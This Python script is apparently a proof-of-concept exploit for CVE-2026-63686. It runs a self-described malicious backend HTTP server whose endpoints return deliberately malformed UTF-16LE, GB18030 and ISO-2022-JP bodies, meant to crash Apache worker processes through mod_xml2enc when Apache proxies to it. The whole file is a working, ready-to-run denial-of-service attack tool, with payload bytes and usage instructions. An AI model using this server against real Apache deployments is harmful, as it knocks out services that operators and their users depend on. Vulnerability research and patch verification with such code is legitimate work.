#!/usr/bin/env python3
"""
CVE-2026-63686 — Malicious Backend Server (Attacker)

Serves HTTP responses with deliberately malformed multi-byte charset bodies.
When Apache's mod_xml2enc attempts to transcode these responses, the truncated
or invalid byte sequences cause a NULL pointer dereference, crashing the
Apache worker process (SIGSEGV / signal 11).

Usage:
    python poison.py                 # listens on 0.0.0.0:8080
    python poison.py --port 9090     # custom port

Payload variants (access via path):
    /          — UTF-16LE orphan byte (default)
    /utf16     — UTF-16LE orphan byte (alias)
    /gb18030   — GB18030 incomplete multi-byte sequence
    /iso2022   — ISO-2022-JP dangling escape sequence
    /safe      — Normal UTF-8 response (control / baseline test)
"""

import http.server
import argparse
import sys
from datetime import datetime


# ──────────────────────────────────────────────────────────
# Payload definitions
# ──────────────────────────────────────────────────────────

PAYLOADS = {
    #  path       : (charset,        raw_bytes,                    description)
    "/":           ("UTF-16LE",      b"\x3c\x00\x3e\x00\x41",
                    "UTF-16LE orphan byte — 5 bytes, last byte has no pair"),

    "/utf16":      ("UTF-16LE",      b"\x3c\x00\x3e\x00\x41",
                    "UTF-16LE orphan byte (alias for /)"),

    "/gb18030":    ("GB18030",       b"\x81\x40\x41",
                    "GB18030 incomplete multi-byte — lead byte 0x81 expects "
                    "a specific trail byte, 0x41 is not valid in that position"),

    "/iso2022":    ("ISO-2022-JP",   b"\x1b\x24\x42\x41\x41\x42",
                    "ISO-2022-JP dangling escape — ESC $ B switches to JIS X 0208 "
                    "two-byte mode but the sequence ends mid-character"),
}

SAFE_BODY = b"<html><body><h1>Safe response (UTF-8)</h1></body></html>"


# ──────────────────────────────────────────────────────────
# Request handler
# ──────────────────────────────────────────────────────────

class PoisonHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves malformed charset responses."""

    def do_GET(self):
        now = datetime.now().strftime("%H:%M:%S")

        # Safe / baseline endpoint
        if self.path == "/safe":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=UTF-8")
            self.send_header("Content-Length", str(len(SAFE_BODY)))
            self.end_headers()
            self.wfile.write(SAFE_BODY)
            print(f"[{now}] SAFE — sent normal UTF-8 response ({len(SAFE_BODY)} bytes)")
            return

        # Malicious payloads
        if self.path in PAYLOADS:
            charset, body, desc = PAYLOADS[self.path]
            self.send_response(200)
            self.send_header("Content-Type", f"text/html; charset={charset}")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"[{now}] POISON — {desc}")
            print(f"         charset={charset}  body={body.hex(' ')}  ({len(body)} bytes)")
            return

        # Unknown path — show available endpoints
        self.send_response(404)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        msg = (
            "Available endpoints:\n"
            "  /         UTF-16LE orphan byte (crash)\n"
            "  /utf16    UTF-16LE orphan byte (crash)\n"
            "  /gb18030  GB18030 incomplete sequence (crash)\n"
            "  /iso2022  ISO-2022-JP dangling escape (crash)\n"
            "  /safe     Normal UTF-8 response (no crash)\n"
        )
        self.wfile.write(msg.encode())

    def log_message(self, fmt, *args):
        """Suppress default access log — we print our own."""
        pass


# ──────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-63686 malicious backend")
    parser.add_argument("--port", type=int, default=8080, help="Listen port (default: 8080)")
    parser.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    args = parser.parse_args()

    server = http.server.HTTPServer((args.bind, args.port), PoisonHandler)
    print("=" * 60)
    print("  CVE-2026-63686 — Malicious Backend (Attacker)")
    print("=" * 60)
    print(f"  Listening on {args.bind}:{args.port}")
    print()
    print("  Payload endpoints:")
    print("    /         UTF-16LE orphan byte")
    print("    /gb18030  GB18030 incomplete sequence")
    print("    /iso2022  ISO-2022-JP dangling escape")
    print("    /safe     Normal response (baseline)")
    print()
    print("  Waiting for Apache to proxy requests here...")
    print("=" * 60)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.shutdown()


if __name__ == "__main__":
    main()
